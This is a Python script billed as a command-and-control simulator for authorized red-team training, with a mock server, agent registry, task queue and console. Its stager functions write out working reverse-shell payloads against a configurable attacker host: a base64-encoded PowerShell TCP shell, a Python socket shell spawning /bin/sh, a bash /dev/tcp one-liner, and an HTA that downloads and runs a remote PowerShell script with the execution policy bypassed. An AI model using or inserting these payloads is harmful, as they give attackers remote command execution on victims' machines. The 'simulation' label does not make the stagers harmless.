#!/usr/bin/env python3
"""
SHIELD C2 Simulator
Command & Control simulation for security testing
For authorized red team exercises only!
"""

import sys
import os
import socket
import threading
import json
import time
import base64
import hashlib
import secrets
from datetime import datetime
from typing import List, Dict, Optional
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

# Force UTF-8
if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')


class C2Agent:
    """Simulated C2 Agent (for testing)"""
    
    def __init__(self, agent_id: str, hostname: str, os_info: str):
        self.id = agent_id
        self.hostname = hostname
        self.os = os_info
        self.ip = '127.0.0.1'
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.status = 'active'
        self.tasks = []
        self.results = []
    
    def to_dict(self) -> Dict:
        return {
            'id': self.id,
            'hostname': self.hostname,
            'os': self.os,
            'ip': self.ip,
            'first_seen': self.first_seen.isoformat(),
            'last_seen': self.last_seen.isoformat(),
            'status': self.status,
            'pending_tasks': len([t for t in self.tasks if t['status'] == 'pending']),
        }
    
    def add_task(self, task_type: str, args: Dict) -> Dict:
        """Add task for agent"""
        task = {
            'id': secrets.token_hex(8),
            'type': task_type,
            'args': args,
            'status': 'pending',
            'created': datetime.now().isoformat(),
        }
        self.tasks.append(task)
        return task
    
    def get_pending_tasks(self) -> List[Dict]:
        """Get pending tasks"""
        return [t for t in self.tasks if t['status'] == 'pending']
    
    def submit_result(self, task_id: str, result: Dict):
        """Submit task result"""
        for task in self.tasks:
            if task['id'] == task_id:
                task['status'] = 'completed'
                task['result'] = result
                task['completed'] = datetime.now().isoformat()
                break


class C2Server:
    """Simulated C2 Server"""
    
    def __init__(self, host: str = '127.0.0.1', port: int = 8888):
        self.host = host
        self.port = port
        self.agents: Dict[str, C2Agent] = {}
        self.listeners = []
        self.logs = []
        self.running = False
    
    def print_banner(self):
        print("""
+==============================================================+
|     SHIELD C2 SIMULATOR v1.0                                 |
|          Command & Control Testing Framework                 |
|                                                              |
|     ⚠ FOR AUTHORIZED RED TEAM TESTING ONLY                   |
|     This simulates C2 behavior for defensive training        |
+==============================================================+
        """)
    
    def log(self, message: str, level: str = 'INFO'):
        """Log event"""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'level': level,
            'message': message,
        }
        self.logs.append(entry)
        print(f"  [{level}] {message}")
    
    def register_agent(self, hostname: str, os_info: str) -> C2Agent:
        """Register new agent"""
        agent_id = secrets.token_hex(8)
        agent = C2Agent(agent_id, hostname, os_info)
        self.agents[agent_id] = agent
        self.log(f"New agent registered: {agent_id} ({hostname})")
        return agent
    
    def get_agent(self, agent_id: str) -> Optional[C2Agent]:
        """Get agent by ID"""
        return self.agents.get(agent_id)
    
    def list_agents(self) -> List[Dict]:
        """List all agents"""
        return [a.to_dict() for a in self.agents.values()]
    
    def task_agent(self, agent_id: str, task_type: str, args: Dict) -> Optional[Dict]:
        """Add task for agent"""
        agent = self.get_agent(agent_id)
        if not agent:
            return None
        
        task = agent.add_task(task_type, args)
        self.log(f"Task {task['id']} added to agent {agent_id}: {task_type}")
        return task
    
    def create_http_listener(self, port: int) -> Dict:
        """Create HTTP listener"""
        listener = {
            'type': 'http',
            'port': port,
            'status': 'active',
            'created': datetime.now().isoformat(),
        }
        self.listeners.append(listener)
        self.log(f"HTTP listener created on port {port}")
        return listener
    
    def create_https_listener(self, port: int, cert_path: str = None) -> Dict:
        """Create HTTPS listener"""
        listener = {
            'type': 'https',
            'port': port,
            'cert': cert_path,
            'status': 'active',
            'created': datetime.now().isoformat(),
        }
        self.listeners.append(listener)
        self.log(f"HTTPS listener created on port {port}")
        return listener
    
    def create_dns_listener(self, domain: str) -> Dict:
        """Create DNS listener"""
        listener = {
            'type': 'dns',
            'domain': domain,
            'status': 'active',
            'created': datetime.now().isoformat(),
        }
        self.listeners.append(listener)
        self.log(f"DNS listener created for domain {domain}")
        return listener
    
    def generate_stager(self, listener_type: str, lhost: str, lport: int) -> Dict:
        """Generate stager payload"""
        stagers = {
            'powershell': self._gen_ps_stager(lhost, lport),
            'python': self._gen_py_stager(lhost, lport),
            'bash': self._gen_bash_stager(lhost, lport),
            'hta': self._gen_hta_stager(lhost, lport),
        }
        
        return {
            'type': listener_type,
            'lhost': lhost,
            'lport': lport,
            'stagers': stagers,
        }
    
    def _gen_ps_stager(self, lhost: str, lport: int) -> str:
        """Generate PowerShell stager"""
        script = f'''
$c = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$s = $c.GetStream()
[byte[]]$b = 0..65535|%{{0}}
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i)
    $r = (iex $d 2>&1 | Out-String)
    $r = $r + "PS " + (pwd).Path + "> "
    $sb = ([text.encoding]::ASCII).GetBytes($r)
    $s.Write($sb,0,$sb.Length)
}}
'''
        encoded = base64.b64encode(script.encode('utf-16le')).decode()
        return f'powershell -e {encoded}'
    
    def _gen_py_stager(self, lhost: str, lport: int) -> str:
        """Generate Python stager"""
        return f'''
import socket,subprocess,os
s=socket.socket()
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''
    
    def _gen_bash_stager(self, lhost: str, lport: int) -> str:
        """Generate Bash stager"""
        return f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
    
    def _gen_hta_stager(self, lhost: str, lport: int) -> str:
        """Generate HTA stager"""
        return f'''
<html>
<head>
<script language="VBScript">
Set s = CreateObject("WScript.Shell")
s.Run "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/payload.ps1')", 0
self.close
</script>
</head>
</html>
'''
    
    def get_statistics(self) -> Dict:
        """Get server statistics"""
        return {
            'total_agents': len(self.agents),
            'active_agents': sum(1 for a in self.agents.values() if a.status == 'active'),
            'total_listeners': len(self.listeners),
            'total_tasks': sum(len(a.tasks) for a in self.agents.values()),
            'completed_tasks': sum(
                sum(1 for t in a.tasks if t['status'] == 'completed')
                for a in self.agents.values()
            ),
        }


class C2HTTPHandler(BaseHTTPRequestHandler):
    """HTTP Handler for C2 communication"""
    
    server_instance: C2Server = None
    
    def log_message(self, format, *args):
        pass  # Suppress default logging
    
    def do_GET(self):
        """Handle GET requests"""
        path = urllib.parse.urlparse(self.path).path
        
        if path == '/beacon':
            # Agent check-in
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "ok"}')
        elif path == '/tasks':
            # Get tasks (would need agent ID in real implementation)
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"tasks": []}')
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Handle POST requests"""
        path = urllib.parse.urlparse(self.path).path
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        
        if path == '/register':
            # Agent registration
            try:
                data = json.loads(body)
                agent = self.server_instance.register_agent(
                    data.get('hostname', 'unknown'),
                    data.get('os', 'unknown')
                )
                response = json.dumps(agent.to_dict())
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(response.encode())
            except Exception as e:
                self.send_response(500)
                self.end_headers()
        elif path == '/result':
            # Task result
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()


class C2Console:
    """Interactive C2 Console"""
    
    def __init__(self, server: C2Server):
        self.server = server
        self.current_agent = None
    
    def run(self):
        """Run interactive console"""
        self.server.print_banner()
        
        print("\n  Available commands:")
        print("    listeners      - List active listeners")
        print("    listener http <port> - Create HTTP listener")
        print("    agents         - List connected agents")
        print("    interact <id>  - Interact with agent")
        print("    task <type>    - Send task to current agent")
        print("    stager <type>  - Generate stager payload")
        print("    stats          - Show statistics")
        print("    logs           - Show recent logs")
        print("    exit           - Exit console")
        
        while True:
            try:
                if self.current_agent:
                    prompt = f"\n[{self.current_agent.hostname}]> "
                else:
                    prompt = "\nshield-c2> "
                
                cmd = input(prompt).strip()
                
                if not cmd:
                    continue
                
                parts = cmd.split()
                command = parts[0].lower()
                
                if command == 'exit':
                    break
                elif command == 'listeners':
                    self._list_listeners()
                elif command == 'listener':
                    if len(parts) >= 3:
                        self._create_listener(parts[1], int(parts[2]))
                elif command == 'agents':
                    self._list_agents()
                elif command == 'interact':
                    if len(parts) >= 2:
                        self._interact(parts[1])
                elif command == 'task':
                    if len(parts) >= 2:
                        self._send_task(parts[1], parts[2:])
                elif command == 'stager':
                    if len(parts) >= 2:
                        self._generate_stager(parts[1])
                elif command == 'stats':
                    self._show_stats()
                elif command == 'logs':
                    self._show_logs()
                elif command == 'back':
                    self.current_agent = None
                else:
                    print(f"  Unknown command: {command}")
                    
            except KeyboardInterrupt:
                print("\n  Use 'exit' to quit")
            except Exception as e:
                print(f"  Error: {e}")
    
    def _list_listeners(self):
        """List listeners"""
        print("\n  Active Listeners:")
        if not self.server.listeners:
            print("    No active listeners")
        else:
            for l in self.server.listeners:
                print(f"    - {l['type'].upper()} on port {l.get('port', 'N/A')}")
    
    def _create_listener(self, ltype: str, port: int):
        """Create listener"""
        if ltype == 'http':
            self.server.create_http_listener(port)
        elif ltype == 'https':
            self.server.create_https_listener(port)
        elif ltype == 'dns':
            self.server.create_dns_listener(f"c2.example.com")
        else:
            print(f"  Unknown listener type: {ltype}")
    
    def _list_agents(self):
        """List agents"""
        print("\n  Connected Agents:")
        agents = self.server.list_agents()
        if not agents:
            print("    No agents connected")
            print("\n    [*] To simulate agent registration:")
            print("        agent = server.register_agent('WORKSTATION-1', 'Windows 10')")
        else:
            for a in agents:
                print(f"    {a['id']} - {a['hostname']} ({a['os']}) - {a['status']}")
    
    def _interact(self, agent_id: str):
        """Interact with agent"""
        agent = self.server.get_agent(agent_id)
        if agent:
            self.current_agent = agent
            print(f"  [*] Interacting with {agent.hostname}")
        else:
            print(f"  Agent not found: {agent_id}")
    
    def _send_task(self, task_type: str, args: List[str]):
        """Send task to agent"""
        if not self.current_agent:
            print("  No agent selected. Use 'interact <id>' first.")
            return
        
        task_args = {'args': args}
        task = self.server.task_agent(self.current_agent.id, task_type, task_args)
        if task:
            print(f"  [+] Task {task['id']} queued")
        else:
            print("  Failed to queue task")
    
    def _generate_stager(self, stager_type: str):
        """Generate stager"""
        stagers = self.server.generate_stager(stager_type, '10.10.10.1', 8888)
        
        if stager_type in stagers['stagers']:
            print(f"\n  {stager_type.upper()} Stager:")
            print("  " + "-" * 50)
            print(stagers['stagers'][stager_type])
            print("  " + "-" * 50)
        else:
            print("  Available stagers: powershell, python, bash, hta")
    
    def _show_stats(self):
        """Show statistics"""
        stats = self.server.get_statistics()
        print("\n  Server Statistics:")
        for key, value in stats.items():
            print(f"    {key}: {value}")
    
    def _show_logs(self):
        """Show logs"""
        print("\n  Recent Logs:")
        for log in self.server.logs[-10:]:
            print(f"    [{log['timestamp']}] {log['level']}: {log['message']}")


def demo():
    """Run C2 simulator demo"""
    server = C2Server()
    server.print_banner()
    
    print("\n  === C2 SIMULATOR DEMO ===")
    
    # Create listener
    print("\n  [*] Creating HTTP listener...")
    server.create_http_listener(8888)
    
    # Simulate agent registration
    print("\n  [*] Simulating agent connections...")
    agent1 = server.register_agent("WORKSTATION-01", "Windows 10 Pro")
    agent2 = server.register_agent("SERVER-DC01", "Windows Server 2019")
    agent3 = server.register_agent("ubuntu-web", "Ubuntu 22.04 LTS")
    
    # List agents
    print("\n  [*] Connected Agents:")
    for agent in server.list_agents():
        print(f"      - {agent['id']}: {agent['hostname']} ({agent['os']})")
    
    # Task agent
    print("\n  [*] Tasking agent...")
    server.task_agent(agent1.id, "shell", {"command": "whoami"})
    server.task_agent(agent1.id, "download", {"url": "http://example.com/tool.exe"})
    
    # Generate stager
    print("\n  [*] Sample Stagers:")
    stagers = server.generate_stager("all", "10.10.10.1", 8888)
    print(f"      PowerShell: {stagers['stagers']['powershell'][:60]}...")
    print(f"      Bash: {stagers['stagers']['bash']}")
    
    # Statistics
    print("\n  [*] Statistics:")
    stats = server.get_statistics()
    for key, value in stats.items():
        print(f"      {key}: {value}")
    
    print("\n  [*] For interactive console: C2Console(server).run()")
    print("\n  [!] Remember: This is a SIMULATION for security training!")


if __name__ == "__main__":
    demo()
